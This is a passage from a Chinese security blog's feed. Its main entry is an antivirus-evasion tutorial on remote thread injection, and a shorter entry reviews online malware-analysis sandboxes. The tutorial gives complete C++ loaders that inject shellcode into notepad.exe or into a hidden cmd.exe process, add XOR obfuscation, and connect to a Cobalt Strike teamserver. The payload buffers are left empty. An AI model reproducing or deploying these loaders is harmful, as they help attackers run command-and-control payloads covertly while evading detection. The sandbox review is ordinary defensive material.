href="https://fengwenhua.top/index.php/archives/64/">https://fengwenhua.top/index.php/archives/64/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;认识shellcode加载器&quot;&gt;&lt;a href=&quot;#认识shellcode加载器&quot; class=&quot;headerlink&quot; title=&quot;认识shellcode加载器&quot;&gt;&lt;/a&gt;认识shellcode加载器&lt;/h1&gt;&lt;p&gt;下面是一个最简单的shellcode加载器，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>免杀基础之远程线程注入</title>
    <link href="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2022-01-15T09:36:51.000Z</published>
    <updated>2022-01-15T09:36:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要参考</p><p><a href="https://fengwenhua.top/index.php/archives/65/%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81%E5%8F%82%E8%80%83https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/%E4%B8%AD%E7%9A%84high">https://fengwenhua.top/index.php/archives/65/，其中最终代码参考https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/中的high</a> level API。</p><h1 id="远程线程中执行shellcode"><a href="#远程线程中执行shellcode" class="headerlink" title="远程线程中执行shellcode"></a>远程线程中执行shellcode</h1><p>shellcode代码与地址无关，理论上将shellcode放入任意程序中给它一个起点就可以执行，因此考虑将shellcode注入到其他进程中以起到隐蔽执行的目的，可以考虑注入到经常进行网络连接的进程中以起到更好的隐蔽效果。</p><h1 id="流程与函数介绍"><a href="#流程与函数介绍" class="headerlink" title="流程与函数介绍"></a>流程与函数介绍</h1><h2 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx()"></a>VirtualAllocEx()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,         <span class="comment">// 申请内存所在的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,        <span class="comment">// 保留页面的内存地址，一般用NULL自动分配</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,           <span class="comment">// 欲分配的内存大小，字节为单位，通常是shellcode大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType, <span class="comment">// 指定要分配的内存类型，常用 MEM_RESERVE | MEM_COMMIT</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect         <span class="comment">// 指定分配的内存保护，由于它将包含要执行的代码，因此常用 PAGE_EXECUTE_READWRITE，可读可写可执行</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>VirtualAllocEx()<strong>用于在指定进程开辟内存空间，所需参数主要为进程的handler，所以需要使用</strong>OpenProcess</strong>函数获取。</p><h2 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess()"></a>OpenProcess()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess, <span class="comment">// 渴望得到的访问权限（标志），那肯定是PROCESS_ALL_ACCESS，所有权限啊</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,  <span class="comment">// 是否继承句柄，一般不</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId      <span class="comment">// 进程标识符，即受害者进程的PID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用OpenProcess获取进程的handler，需要知道进程的PID。</p><p><strong>假设知道了进程的PID</strong>，那么应该如何将shellcode拷贝进去？之前简单的加载器用的是memcpy方法拷贝shellcode，但是因为我们要写入的是进程的内存区域，所以需要用<strong>WriteProcessMemory</strong>函数</p><h2 id="WriteProcessMemory（）"><a href="#WriteProcessMemory（）" class="headerlink" title="WriteProcessMemory（）"></a>WriteProcessMemory（）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,               <span class="comment">// 要向其中写入数据的进程，即由OpenProcess返回的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,          <span class="comment">// 要写入的数据的首地址，VirtualAllocEx的返回值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,               <span class="comment">// 指向要写的数据的指针，该指针必须是const指针，即shellcode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,                  <span class="comment">// 要写入的字节数，shellcode大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten <span class="comment">// 接收传输到指定进程中的字节数，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将shellcode写入内存后，需要调用一下，调用方法为<strong>CreateRemoteThread</strong>()</p><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h2><p><strong>CreateRemoteThread是一个Windows API函数，它能够创建一个在其它进程地址空间中运行的线程</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,           <span class="comment">// 线程所属进程的进程句柄，即OpenProcess返回的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes, <span class="comment">// 线程的安全属性，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,        <span class="comment">// 线程栈初始大小,以字节为单位，通常为0，即代表使用系统默认大小.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,     <span class="comment">// 在远程进程的地址空间中,该进程的线程函数的起始地址。VirtualAllocEx返回值，注意需要强制类型转换成 LPTHREAD_START_ROUTINE</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,        <span class="comment">// 传给线程函数的参数的指针，这里为NULL，在DLL注入的时候有重要意义</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,    <span class="comment">// 线程的创建标志，通常为0，即线程创建后立即运行</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId          <span class="comment">// 指向所创建线程ID的指针，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="将shellcode注入到notepad-exe中-已知pid"><a href="#将shellcode注入到notepad-exe中-已知pid" class="headerlink" title="将shellcode注入到notepad.exe中(已知pid)"></a>将shellcode注入到notepad.exe中(已知pid)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Injecting to PID: %i&quot;</span>, <span class="built_in">atoi</span>(argv[<span class="number">1</span>]));</span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="built_in">DWORD</span>(<span class="built_in">atoi</span>(argv[<span class="number">1</span>])));</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220115153615536.png" alt="image-20220115153615536"></p><p><img src="http://cdn.polowong.top/image-20220115153558970.png" alt="image-20220115153558970"></p><p><img src="http://cdn.polowong.top/image-20220115153755016.png" alt="image-20220115153755016"></p><p>可以看到shellcode已经被注入到notepad.exe了，并且与CS teamserver建立了网络连接，但是这样不是太方便，需要先知道进程的pid，所以该代码还需要改进。</p><h1 id="将shellcode注入到指定进程中-未知pid"><a href="#将shellcode注入到指定进程中-未知pid" class="headerlink" title="将shellcode注入到指定进程中(未知pid)"></a>将shellcode注入到指定进程中(未知pid)</h1><p>代码如下，但是该方法存在一个问题，注入的权限要求有点大，我试了试注入其他进程（Windows自带的）失败了（<strong>管理员权限可以随便注入</strong>），所以该方法适用于可以RCE的时候，先打开一个notepad然后进行注入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcessSnap;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    DWORD pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取系统中所有进程的快照</span></span><br><span class="line">    hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使用之前要先设置大小</span></span><br><span class="line">    pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">    <span class="comment">// 查看第一个进程</span></span><br><span class="line">    BOOL bRet = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">wcscmp</span>(pe32.szExeFile, <span class="string">L&quot;notepad.exe&quot;</span>) == <span class="number">0</span>) &#123;<span class="comment">//注入到notepad.exe进程中</span></span><br><span class="line">            pid = pe32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取进程句柄</span></span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//远程线程注入部分</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220115163605656.png" alt="image-20220115163605656"></p><p><img src="http://cdn.polowong.top/image-20220115163943913.png" alt="image-20220115163943913">当权限为管理员的时候，可以注入任意进程。上面的cmd框是正常用户权限启动的cmd，下面是run as admin。</p><h1 id="新建进程并注入shellcode"><a href="#新建进程并注入shellcode" class="headerlink" title="新建进程并注入shellcode"></a>新建进程并注入shellcode</h1><p>上面的方法只能注入到现有进程，并且存在权限问题，实用性较低，现考虑新建进程并远程线程注入shellcode.</p><p>注意，下面的代码被杀穿了，还不如shellcode直接加载的效果好，因为注入本来就不是正常操作，不加shellcode上传vt也有13个报毒，仅学习思想。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in"><span class="keyword">sizeof</span></span>(si));</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in"><span class="keyword">sizeof</span></span>(pi));</span><br><span class="line">    <span class="comment">//配置startup info，隐藏新启动的进程窗口</span></span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(STARTUPINFO);</span><br><span class="line">    si.lpReserved = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpDesktop = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpTitle = <span class="literal">NULL</span>;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.cbReserved2 = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpReserved2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LPCWSTR cmd;</span><br><span class="line">    cmd = <span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">        cmd,<span class="comment">// Executable</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Command line</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Process handle not inheritable</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Thread handle not inheritable</span></span><br><span class="line">        FALSE,<span class="comment">// Set handle inheritance to FALSE</span></span><br><span class="line">        CREATE_NO_WINDOW,            <span class="comment">// Do Not Open a Window</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Use parent&#x27;s environment block</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Use parent&#x27;s starting directory </span></span><br><span class="line">        &amp;si,                <span class="comment">// Pointer to STARTUPINFO structure</span></span><br><span class="line">        &amp;pi <span class="comment">// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)</span></span><br><span class="line">    )) &#123;</span><br><span class="line">        DWORD errval = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;FAILED&quot;</span> &lt;&lt; errval &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(pi.hProcess, <span class="number">1000</span>); <span class="comment">// Allow nslookup 1 second to start/initialize.</span></span><br><span class="line">    <span class="comment">//远程线程注入部分</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in"><span class="keyword">sizeof</span></span>(buf); i++)</span><br><span class="line">   &#123;</span><br><span class="line">       buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文主要参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fengwenhua.top/index.php/archives/65/%E</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>几款优秀的在线样本分析网站(重保值守必备）</title>
    <link href="https://polosec.github.io/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/"/>
    <id>https://polosec.github.io/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/</id>
    <published>2022-01-12T09:24:00.000Z</published>
    <updated>2022-01-12T09:28:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>排名不分先后，都比较优秀（除了腾讯哈勃）</p><p>1.virustotal</p><p>懂得都懂，用的最多，开放引擎api最多</p><p>亮点功能：在线样本提交与扫描，较为全面。</p><p>2.<a href="https://sandbox.pikker.ee/">sandbox.pikker.ee</a></p><p>亮点功能：免费，字符串提取，静态行为分析，杀软结果识别，<strong>进程分析，文件释放分析，网络连接分析，释放的文件也可以进行分析</strong></p><p><img src="http://cdn.polowong.top/image-20220112172617888.png" alt="image-20220112172617888"></p><p><img src="http://cdn.polowong.top/image-20220112172602344.png" alt="image-20220112172602344"></p><p><img src="http://cdn.polowong.top/image-20220112172542769.png" alt="image-20220112172542769"></p><p>3.ThreadBook sandbox 微步在线云沙箱</p><p><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></p><p>亮点功能：<strong>免费</strong>，在线杀软识别，<strong>行为检测（API调用），执行流程图，进程调用与网络连接</strong></p><p><img src="http://cdn.polowong.top/image-20220112172648489.png" alt="image-20220112172648489"></p><hr><p>4.<a href="https://yomi.yoroi.company/">yomi.yoroi.company</a></p><p>亮点功能：支持试用；<strong>行为分析、动态分析、网络分析、文件释放分析、进程调用图、释放的文件也可以进行分析</strong></p><p><img src="http://cdn.polowong.top/image-20220112172708949.png" alt="image-20220112172708949"></p><p><img src="http://cdn.polowong.top/image-20220112172641040.png" alt="image-20220112172641040"></p><p>5.腾讯哈勃</p><p><a href="https://habo.qq.com/file/">https://habo.qq.com/file/</a></p><p>垃圾：不支持sha1 sha256搜索</p><p>亮点功能：免费</p><p>6.<a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a></p><p>亮点功能：免费、<strong>分析全面（网络、进程、DNS、HTTP、文件释放），释放的文件也可以进行分析，字符串搜索，结合VT结果</strong></p><p><img src="http://cdn.polowong.top/image-20220112172716764.png" alt="image-20220112172716764"></p><p>7.<a href="https://analyze.intezer.com/file-analyses">https://analyze.intezer.com/file-analyses</a></p><p>亮点功能：除了不免费外（可试用，但只有两周），基本都是亮点。<strong>反汇编！！、动态分析、静态分析、网络、进程、文件释放、分析释放的文件、字符串搜索、结合VT结果。。。。等等</strong></p><p><img src="http://cdn.polowong.top/image-20220112172814171.png" alt="image-20220112172814171"></p><p>文件释放分析：</p><p><img src="http://cdn.polowong.top/image-20220112172728847.png" alt="image-20220112172728847"></p><p><strong>推断出了样本中的代码和哪些恶意样本的重合率高，这里推出了net traveler APT组织。</strong></p><p><img src="http://cdn.polowong.top/image-20220112172741816.png" alt="image-20220112172741816"></p><p><img src="http://cdn.polowong.top/image-20220112172753156.png" alt="image-20220112172753156"></p><p>字符串搜索与反汇编</p><p><img src="http://cdn.polowong.top/image-20220112172801789.png" alt="image-20220112172801789"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;排名不分先后，都比较优秀（除了腾讯哈勃）&lt;/p&gt;
&lt;p&gt;1.virustotal&lt;/p&gt;
&lt;p&gt;懂得都懂，用的最多，开放引擎api最多&lt;/p&gt;
&lt;p&gt;亮点功能：在线样本提交与扫描，较为全面。&lt;/p&gt;
&lt;p&gt;2.&lt;a href=&quot;https://sandbox.pikker.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Venom——一款优秀的基于go语言实现的内网穿透工具</title>
